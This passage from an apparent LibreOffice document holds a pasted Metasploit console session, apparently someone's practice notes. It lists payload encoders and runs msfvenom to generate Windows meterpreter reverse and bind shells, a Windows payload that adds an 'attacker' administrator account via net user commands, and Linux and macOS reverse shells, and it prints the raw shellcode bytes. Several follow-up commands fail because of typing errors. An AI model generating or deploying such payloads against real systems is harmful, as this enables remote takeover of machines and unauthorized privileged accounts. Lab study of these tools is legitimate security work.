      <text:p text:style-name="P1"><text:s text:c="4"/>x64/zutto_dekiru <text:s text:c="5"/>manual <text:s text:c="4"/>Zutto Dekiru</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/add_sub <text:s text:c="10"/>manual <text:s text:c="4"/>Add/Sub Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/alpha_mixed <text:s text:c="6"/>low <text:s text:c="7"/>Alpha2 Alphanumeric Mixedcase E</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ncoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/alpha_upper <text:s text:c="6"/>low <text:s text:c="7"/>Alpha2 Alphanumeric Uppercase E</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ncoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/avoid_underscore <text:s/>manual <text:s text:c="4"/>Avoid underscore/tolower</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>_tolower</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/avoid_utf8_tolow <text:s/>manual <text:s text:c="4"/>Avoid UTF8/tolower</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/bloxor <text:s text:c="11"/>manual <text:s text:c="4"/>BloXor - A Metamorphic Block Ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sed XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/bmp_polyglot <text:s text:c="5"/>manual <text:s text:c="4"/>BMP Polyglot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/call4_dword_xor <text:s text:c="2"/>normal <text:s text:c="4"/>Call+4 Dword XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/context_cpuid <text:s text:c="4"/>manual <text:s text:c="4"/>CPUID-based Context Keyed Paylo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ad Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/context_stat <text:s text:c="5"/>manual <text:s text:c="4"/>stat(2)-based Context Keyed Pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>load Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/context_time <text:s text:c="5"/>manual <text:s text:c="4"/>time(2)-based Context Keyed Pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>load Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/countdown <text:s text:c="8"/>normal <text:s text:c="4"/>Single-byte XOR Countdown Encod</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/fnstenv_mov <text:s text:c="6"/>normal <text:s text:c="4"/>Variable-length Fnstenv/mov Dwo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rd XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/jmp_call_additiv <text:s/>normal <text:s text:c="4"/>Jump/Call XOR Additive Feedback</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e <text:s text:c="32"/>Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/nonalpha <text:s text:c="9"/>low <text:s text:c="7"/>Non-Alpha Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/nonupper <text:s text:c="9"/>low <text:s text:c="7"/>Non-Upper Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/opt_sub <text:s text:c="10"/>manual <text:s text:c="4"/>Sub Encoder (optimised)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/service <text:s text:c="10"/>manual <text:s text:c="4"/>Register Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/shikata_ga_nai <text:s text:c="3"/>excellent <text:s/>Polymorphic XOR Additive Feedba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/single_static_bi <text:s/>manual <text:s text:c="4"/>Single Static Bit</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/unicode_mixed <text:s text:c="4"/>manual <text:s text:c="4"/>Alpha2 Alphanumeric Unicode Mix</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>edcase Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/unicode_upper <text:s text:c="4"/>manual <text:s text:c="4"/>Alpha2 Alphanumeric Unicode Upp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ercase Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/xor_dynamic <text:s text:c="6"/>normal <text:s text:c="4"/>Dynamic key XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x86/xor_poly <text:s text:c="9"/>normal <text:s text:c="4"/>XOR POLY Encoder</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp </text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -p windows/meterpreter/reverse_tcp </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</text:p>
      <text:p text:style-name="P1">[-] No arch selected, selecting arch: x86 from the payload</text:p>
      <text:p text:style-name="P1">No encoder specified, outputting raw payload</text:p>
      <text:p text:style-name="P1">Payload size: 354 bytes</text:p>
      <text:p text:style-name="P1">��`��1�d�R0�R</text:p>
      <text:p text:style-name="P1">��8�u�}�;}$u�X�X$�f��X �HӅ�t&lt;I�4��1�1���</text:p>
      <text:p text:style-name="P1"><text:s text:c="20"/>K�XӋ�ЉD$$[[aYZQ��X_Z�����]h32hws2_ThLw&amp;���и�)�TPh)�k��j</text:p>
      <text:p text:style-name="P1">h��kh\��PPPP@P@Ph����՗jVWh��ta�Յ�t</text:p>
      <text:p text:style-name="P1">�u��gjjVWh��_�Ճ�~6�6j@hVjhX�S��ՓSjVSWh��_�Ճ�}(Xh@jPh</text:p>
      <text:p text:style-name="P1"><text:s text:c="52"/>/0��WhunMa��^^�</text:p>
      <text:p text:style-name="P1"><text:s text:c="67"/>$�p��������)�u�û�VjS��</text:p>
      <text:p text:style-name="P1">msf6 &gt; LHOST=(IP Address) LPORT=(Your Port) -f exe &gt; reverse.exe</text:p>
      <text:p text:style-name="P1">[-] Unknown command: LHOST=(IP</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>msf6 &gt; msfvenom -p windows/meterpreter/bind_tcp </text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -p windows/meterpreter/bind_tcp </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</text:p>
      <text:p text:style-name="P1">[-] No arch selected, selecting arch: x86 from the payload</text:p>
      <text:p text:style-name="P1">No encoder specified, outputting raw payload</text:p>
      <text:p text:style-name="P1">Payload size: 326 bytes</text:p>
      <text:p text:style-name="P1">��`��1�d�R0�R</text:p>
      <text:p text:style-name="P1">��8�u�}�;}$u�X�X$�f��H�X Ӆ�t&lt;I1��4��1���</text:p>
      <text:p text:style-name="P1"><text:s text:c="20"/>K�XӋ�ЉD$$[[aYZQ��X_Z�����]h32hws2_ThLw&amp;�ո�)�TPh)�k��j</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>YP��jjh����՗h\��jVWh��7g�Յ��XWh��8���Wht�;���W�hunMa��jjVWh��_�Ճ�~-�6j@hVjhX�S��ՓSjVSWh��_�Ճ�~�)�u�û�VjS��</text:p>
      <text:p text:style-name="P1">msf6 &gt; RHOST=(IP Address) LPORT=(Your Port) -f exe &gt; bind.exe</text:p>
      <text:p text:style-name="P1">[-] Unknown command: RHOST=(IP</text:p>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -p windows/adduser USER=attacker </text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -p windows/adduser USER=attacker </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</text:p>
      <text:p text:style-name="P1">[-] No arch selected, selecting arch: x86 from the payload</text:p>
      <text:p text:style-name="P1">No encoder specified, outputting raw payload</text:p>
      <text:p text:style-name="P1">Payload size: 278 bytes</text:p>
      <text:p text:style-name="P1">��`��1�d�P0�R</text:p>
      <text:p text:style-name="P1">�8�u�}�;}$u�X�X$�f� ӋI�:I�4��1����</text:p>
      <text:p text:style-name="P1"><text:s text:c="19"/>K�XӋ�ЉD$$[[aYZQ��__Z��]j���Ph1�o��ջ�Vh������&lt;|</text:p>
      <text:p text:style-name="P1">���u�GrojS��cmd.exe /c net user attacker Metasploit$1 /ADD &amp;&amp; net localgroup Administrators attacker /ADD</text:p>
      <text:p text:style-name="P1">msf6 &gt; PASS=attacker@123 -f exe &gt; adduser.exe</text:p>
      <text:p text:style-name="P1">[-] Unknown command: PASS=attacker@123</text:p>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -p linux/x86/meterpreter/reverse_tcp </text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -p linux/x86/meterpreter/reverse_tcp </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</text:p>
      <text:p text:style-name="P1">[-] No arch selected, selecting arch: x86 from the payload</text:p>
      <text:p text:style-name="P1">No encoder specified, outputting raw payload</text:p>
      <text:p text:style-name="P1">Payload size: 123 bytes</text:p>
      <text:p text:style-name="P1">j</text:p>
      <text:p text:style-name="P1">^1���SCSj�f��̀�[h��kh\��jfXPQW��C̀��yNt=h�Xjj��1�̀��y��'������</text:p>
      <text:p text:style-name="P1"><text:s text:c="59"/>��</text:p>
      <text:p text:style-name="P1"><text:s text:c="61"/>�}̀��x[�ᙲj�̀��x���̀</text:p>
      <text:p text:style-name="P1">msf6 &gt; LHOST=(IP Address) LPORT=(Your Port) -f elf &gt; reverse.elf</text:p>
      <text:p text:style-name="P1">[-] Unknown command: LHOST=(IP</text:p>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -p linux/x64/shell_reverse_tcp </text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -p linux/x64/shell_reverse_tcp </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>[-] No arch selected, selecting arch: x64 from the payload</text:p>
      <text:p text:style-name="P1">No encoder specified, outputting raw payload</text:p>
      <text:p text:style-name="P1">Payload size: 74 bytes</text:p>
      <text:p text:style-name="P1">j)X�j_j^H�H�\��kQH��jZj*Xj^H��j!Xu�j;X�H�/bin/shSH��RWH��</text:p>
      <text:p text:style-name="P1">msf6 &gt; LHOST=IP LPORT=PORT -f elf &gt; shell.elf</text:p>
      <text:p text:style-name="P1">[-] Unknown command: LHOST=IP</text:p>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho &gt; reverse.macho</text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho &gt; reverse.macho</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">sh: 1: Syntax error: "(" unexpected</text:p>
      <text:p text:style-name="P1">msf6 &gt;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4:59:26.747783759</meta:creation-date>
    <dc:date>2024-01-24T15:00:10.951201940</dc:date>
    <meta:editing-duration>PT44S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="111" meta:paragraph-count="5703" meta:word-count="31590" meta:character-count="364882" meta:non-whitespace-character-count="185574"/>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>